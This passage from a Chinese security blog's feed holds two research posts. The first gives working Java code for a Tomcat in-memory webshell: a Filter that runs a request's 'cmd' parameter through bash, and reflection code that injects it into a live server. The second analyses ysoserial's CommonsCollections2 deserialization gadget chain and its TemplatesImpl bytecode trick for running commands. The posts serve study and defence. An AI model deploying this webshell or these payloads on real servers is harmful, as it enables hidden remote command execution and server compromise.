java.lang.Thread.run(Thread.java:745)</span><br></pre></td></tr></table></figure><h2 id="Servlet内存shell"><a href="#Servlet内存shell" class="headerlink" title="Servlet内存shell"></a>Servlet内存shell</h2><h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><h4 id="恶意Filter"><a href="#恶意Filter" class="headerlink" title="恶意Filter"></a>恶意Filter</h4><p>以下Filter针对每个请求，如果参数带cmd，则bash -c执行其参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">      <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)</span></span></span><br><span class="line"><span class="function">         <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">      <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">      HttpServletRequest req = (HttpServletRequest)arg0;</span><br><span class="line">      <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">         Process p = <span class="keyword">new</span> ProcessBuilder(<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();</span><br><span class="line">         <span class="keyword">int</span> len = p.getInputStream().read(data);</span><br><span class="line">         p.destroy();</span><br><span class="line">         arg1.getWriter().write(<span class="keyword">new</span> String(data, <span class="number">0</span>, len));</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      arg2.doFilter(arg0, arg1);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="加载Filter"><a href="#加载Filter" class="headerlink" title="加载Filter"></a>加载Filter</h4><p>n1nty师傅代码已经给出了加载Filter的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 组装 fiter 为FilterMap</span></span><br><span class="line">         FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">         filterDef.setFilterName(name);</span><br><span class="line">         filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">         filterDef.setFilter(filter);</span><br><span class="line">         FilterMap m = <span class="keyword">new</span> FilterMap();</span><br><span class="line">         m.setFilterName(filterDef.getFilterName());</span><br><span class="line">         m.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">         m.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 standardCtx</span></span><br><span class="line">         ServletContext ctx = request.getSession().getServletContext();</span><br><span class="line">         Field f = ctx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">         f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         ApplicationContext appCtx = (ApplicationContext) f.get(ctx);</span><br><span class="line"></span><br><span class="line">         f = appCtx.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">         f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         StandardContext standardCtx = (StandardContext) f.get(appCtx);</span><br><span class="line"></span><br><span class="line">         f = standardCtx.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">         f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         Map filterConfigs = (Map) f.get(standardCtx);</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line"><span class="comment">// 加载FilterMap</span></span><br><span class="line">         standardCtx.addFilterDef(filterDef);</span><br><span class="line">         standardCtx.addFilterMapBefore(m);</span><br><span class="line"></span><br><span class="line">         Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">         constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         FilterConfig filterConfig = (FilterConfig) constructor.newInstance(standardCtx, filterDef);</span><br><span class="line"></span><br><span class="line">         filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure><p>但是又是如何定位到的呢？</p><p>** step1: 官方ServletContext自带的addFilter 接口 **</p><p>类org.apache.catalina.core.ApplicationContextFacade#addFilter接口</p><p>调用org.apache.catalina.core.ApplicationContext#addFilter接口</p><p>但是不行，存在限制，容器启动之后无法调用</p><p>** step2 手动实现addFilter接口 **</p><p>调试最终定位到</p><p>org.apache.catalina.core.ApplicationFilterFactory#createFilterChain</p><h4 id="排序Filter"><a href="#排序Filter" class="headerlink" title="排序Filter"></a>排序Filter</h4><p>threedr3am师傅有在参考【6】中提及，tomcat回显时涉及到Filter排序的问题</p><p>internalDoFilter默认会执行所有的Filter，然后再进入doGet/doPost流程</p><p>Shiro是自定义的Filter，所以不能通过通过这种方式取到response回显。</p><p>（shiro的大概逻辑明白了，有空调试下）</p><p>前文有提到web.xml中Filter的排序执行问题，对于只是tomcat内存shell的话，几乎无影响</p><p>threedr3am师傅的TomcatShell有默认把evil Filter放在首位</p><h3 id="Servlet型"><a href="#Servlet型" class="headerlink" title="Servlet型"></a>Servlet型</h3><p>待补充</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>思考问题</p><ol><li><p>n1nty师傅还提到 “动态插入 Valve” 的方式，如何实现？</p></li><li><p>php作为最火的语言，可以实现无文件webshell吗？</p></li><li><p>如上，python框架，flask/django，uwsgi呢？</p></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://mp.weixin.qq.com/s/x4pxmeqC1DvRi9AdxZ-0Lw">Tomcat 源代码调试笔记 - 看不见的 Shell</a></li><li>[2] <a href="https://mp.weixin.qq.com/s/DRbGeVOcJ8m9xo7Gin45kQ">杂谈Java内存Webshell的攻与防</a></li><li>[3] <a href="https://www.cnblogs.com/whgk/p/6399262.html">Java Web(一) Servlet详解！！</a></li><li>[4] <a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet 教程</a></li><li>[5] <a href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/">查杀Java web filter型内存马</a></li><li>[6] <a href="https://xz.aliyun.com/t/7388#toc-1">基于tomcat的内存 Webshell 无文件攻击技术</a></li><li>[7] <a href="https://www.jianshu.com/p/cbe1c3174d41">动态注册之Servlet+Filter+Listener</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在学习Java内存shell相关知识，总结沉淀几篇文章，权当学习笔记了。&lt;/p&gt;
&lt;h2 id=&quot;Java内存webshell史&quot;&gt;&lt;a href=&quot;#Java内存webshell史&quot; class=&quot;headerlink&quot; title=&quot;Java内存webshell史&quot;&gt;&lt;/a&gt;Java内存webshell史&lt;/h2&gt;&lt;p&gt;直接引用c0ny1师傅的总结，写的太好了&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;其实内存马由来已久，早在17年n1nty师傅的《Tomcat源码调试笔记-看不见的shell》中已初见端倪，但一直不温不火。后经过rebeyong师傅使用agent技术加持后，拓展了内存马的使用场景，然终停留在奇技淫巧上。在各类hw洗礼之后，文件shell明显气数已尽。内存马以救命稻草的身份重回大众视野。特别是今年在shiro的回显研究之后，引发了无数安全研究员对内存webshell的研究，其中涌现出了LandGrey师傅构造的Spring controller内存马。至此内存马开枝散叶发展出了三大类型：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1. servlet-api类&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	filter型&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	servlet型&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2. spring类&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	拦截器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	controller型&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3. Java Instrumentation类&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	agent型&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;内存马这坛深巷佳酒，一时间流行于市井与弄堂之间。上至安全研究员下至普通客户，人尽皆知。正值hw来临之际，不难推测届时必将是内存马横行天下之日。而各大安全厂商却迟迟未见动静。所谓表面风平浪静，实则暗流涌动。或许一场内存马的围剿计划正慢慢展开。作为攻击方向的研究人员，没有对手就制造对手,攻防互换才能提升内存马技术的发展。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="内存马" scheme="http://m0d9.me/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="shell" scheme="http://m0d9.me/tags/shell/"/>
    
    <category term="servlet" scheme="http://m0d9.me/tags/servlet/"/>
    
  </entry>
  
  <entry>
    <title>ysoserial工具分析：TemplatesImpl链与代码执行</title>
    <link href="http://m0d9.me/2020/09/25/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90%EF%BC%9ATemplatesImpl%E9%93%BE%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://m0d9.me/2020/09/25/%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90%EF%BC%9ATemplatesImpl%E9%93%BE%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2020-09-25T02:20:00.000Z</published>
    <updated>2021-12-27T07:14:13.309Z</updated>
    
    <content type="html"><![CDATA[<p>ysoserial的payload只看过Groovy和CommonsCollections1，就一直以为ysoserial是简单的通过最终调用Runtime.getRuntime().exec(cmd)来实现各种利用链的命令执行的，太年轻。。。</p><p>本文以CommonsCollections2为例，主要介绍：</p><ol><li>ysoserial通过TemplatesImpl实现的通用命令执行打包</li><li>如何实现代码执行（非命令执行）</li></ol><a id="more"></a><h2 id="ysoserial-流程简介"><a href="#ysoserial-流程简介" class="headerlink" title="ysoserial 流程简介"></a>ysoserial 流程简介</h2><p>作者也是很皮的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar </span><br><span class="line">Y SO SERIAL?</span><br><span class="line">Usage: java -jar ysoserial-[version]-all.jar [payload] <span class="string">&#x27;[command]&#x27;</span></span><br><span class="line">Payload                 Authors                Dependencies</span><br><span class="line">-------                 -------                ------------            </span><br><span class="line">BeanShell1             @pwntester, @cschneider4711      bsh:2.0b5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>入口是ysoserial.GeneratePayload, GeneratePayload里面组合成最终的paylaod流程很简单，不多介绍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ObjectPayload payload = payloadClass.newInstance();</span><br><span class="line"><span class="keyword">final</span> Object object = payload.getObject(command);</span><br><span class="line">PrintStream out = System.out;</span><br><span class="line">Serializer.serialize(object, out);</span><br><span class="line">ObjectPayload.Utils.releasePayload(payload, object);</span><br></pre></td></tr></table></figure><h3 id="getObject"><a href="#getObject" class="headerlink" title="getObject"></a>getObject</h3><p>getObject是每个payload的通用接口函数，最终返回被序列化的obj</p><p>以CommonsCollections2 为例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String ... command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中首尾需要注意，为通用打包逻辑，中间为CommonsCollections2的利用链。下文详细讲解这两个逻辑。</p><h2 id="CommonsCollections2的利用链"><a href="#CommonsCollections2的利用链" class="headerlink" title="CommonsCollections2的利用链"></a>CommonsCollections2的利用链</h2><p>ysoserial对于CommonsCollections2调用链的解释：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>跟进调试</p><p><img src="/images/pasted-109.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">transform:129, InvokerTransformer (org.apache.commons.collections4.functors)</span><br><span class="line">compare:81, TransformingComparator (org.apache.commons.collections4.comparators)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br></pre></td></tr></table></figure><p>其中有意思的点</p><ol><li><p>PriorityQueue 的属性queue是个数组，PriorityQueue 反序列化会对queue每个内容进行反序列化为objN，然后调用heapify方法，大致功能应该是计算每个queue的优先级。</p></li><li><p>heapify - siftDown - siftDownUsingComparator，为了比较相邻两个值属性，引入了接口Comparator, 其中TransformingComparator是该接口的实现。</p></li><li><p>TransformingComparator compare方法，通过Transformer 将待比较的两值归一化，接口Transformer的实现类InvokerTransformer。</p></li><li><p>InvokerTransformer transform 方法使用了invoke，而且method、class、args都可自定义。</p></li><li><p>那接下来就是寻找可以class.method(args)可执行任意命令的类了。ysoserial使用的是通用的TemplatesImpl。</p></li></ol><h2 id="通用的TemplatesImpl"><a href="#通用的TemplatesImpl" class="headerlink" title="通用的TemplatesImpl"></a>通用的TemplatesImpl</h2><p>参考【1】中对TemplatesImpl这两段总结的很好，直接使用，总结为2点</p><ol><li><p>TemplatesImpl类有意思的属性，是个byte[]数组，可以存class</p></li><li><p>TemplatesImpl类的getTransletInstance方法会将该class实例化。</p></li></ol><p>那么思路就是：</p><ol><li><p>将command写在class 的static 方法内，转化为byte数组存在TemplatesImpl 实例内</p></li><li><p>触发TemplatesImpl 实例的getTransletInstance 方法</p></li></ol><h3 id="利用TemplatesImpl类存储危险的字节码"><a href="#利用TemplatesImpl类存储危险的字节码" class="headerlink" title="利用TemplatesImpl类存储危险的字节码"></a>利用TemplatesImpl类存储危险的字节码</h3><p>这里强烈建议阅读原文，或者之后单独写篇javassist的字节码操作</p><p>留下两个相关知识点：</p><ol><li>class 和 byte[] 如何相互转换</li><li>使用javassist在class内插入static代码</li></ol><p>相关代码逻辑在ysoserial.util.Gadgets#createTemplatesImpl上半部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title">createTemplatesImpl</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> TemplatesImpl templates = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    ClassPool pool = ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload.class));</span><br><span class="line">    <span class="keyword">final</span> CtClass clazz = pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">    clazz.makeClassInitializer().insertAfter(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> + command.replaceAll(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line">    <span class="comment">// added by m0d9</span></span><br><span class="line">    clazz.writeFile();</span><br></pre></td></tr></table></figure><p>ysoserial生成的class文件demo</p><p><img src="/images/pasted-111.png" alt="upload successful"></p><h3 id="触发TemplatesImpl类加载-bytecodes属性中的字节码"><a href="#触发TemplatesImpl类加载-bytecodes属性中的字节码" class="headerlink" title="触发TemplatesImpl类加载_bytecodes属性中的字节码"></a>触发TemplatesImpl类加载_bytecodes属性中的字节码</h3><p>ysoserial对于TemplatesImpl调用链的解释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">  TemplatesImpl.newTransformer()</span><br><span class="line">    TemplatesImpl.getTransletInstance()</span><br><span class="line">      TemplatesImpl.defineTransletClasses()</span><br><span class="line">        ClassLoader.defineClass()</span><br><span class="line">        Class.newInstance()</span><br><span class="line">          ...</span><br><span class="line">            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">            &#x2F;&#x2F;class新建初始化对象后，会执行恶意类中的静态方法，即:我们插入的恶意java代码</span><br><span class="line">              ...</span><br><span class="line">                Runtime.exec()&#x2F;&#x2F;这里可以是任意java代码，比如:反弹shell等等。 </span><br></pre></td></tr></table></figure><p><img src="/images/pasted-110.png" alt="upload successful"></p><p>相关代码逻辑在ysoserial.util.Gadgets#createTemplatesImpl下半部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// inject class bytes into instance</span></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">    classBytes,</span><br><span class="line">    ClassFiles.classAsBytes(Foo.class)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line"><span class="keyword">return</span> templates;</span><br></pre></td></tr></table></figure><h2 id="实现代码执行"><a href="#实现代码执行" class="headerlink" title="实现代码执行"></a>实现代码执行</h2><p>参考【2】中有实现，可以参考其中的TomcatEchoInject、TomcatShellInject</p><ol><li><p>自定义继承AbstractTranslet类，static代码段为需要实现的代码</p></li><li><p>将该类class转为byte，存入TemplatesImpl byte数组即可</p></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html">java反序列化工具ysoserial分析</a></li><li>[2] <a href="https://github.com/threedr3am/ysoserial">threedr3am/ysoserial</a></li><li>[3] <a href="https://github.com/wh1t3p1g/ysomap">wh1t3p1g/ysomap</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;ysoserial的payload只看过Groovy和CommonsCollections1，就一直以为ysoserial是简单的通过最终调用Runtime.getRuntime().exec(cmd)来实现各种利用链的命令执行的，太年轻。。。&lt;/p&gt;
&lt;p&gt;本文以CommonsCollections2为例，主要介绍：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ysoserial通过TemplatesImpl实现的通用命令执行打包&lt;/li&gt;
&lt;li&gt;如何实现代码执行（非命令执行）&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="Ysoserial" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/Ysoserial/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="ysoserial" scheme="http://m0d9.me/tags/ysoserial/"/>
    
    <category term="TemplatesImpl" scheme="http://m0d9.me/tags/TemplatesImpl/"/>
    
  </entry>
  
</feed>
